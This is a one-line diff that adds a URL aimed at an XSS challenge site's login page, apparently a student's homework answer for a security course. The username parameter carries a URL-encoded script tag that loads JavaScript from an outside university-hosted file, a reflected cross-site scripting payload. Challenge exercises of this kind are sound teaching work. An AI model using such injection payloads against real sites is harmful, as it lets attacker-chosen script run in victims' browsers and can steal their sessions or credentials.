@@ -1,0 +1,1 @@
+http://xss-challenges.r7.io/0/login?username=%3Cscript+type%3D%22text%2Fjavascript%22+src%3D%22http%3A%2F%2Fstudents.washington.edu%2Fdavinl%2F415_hw3%2Fpart2%2Fpart_2.js%22%3E%3C%2Fscript%3E&password=hello&user_language=english
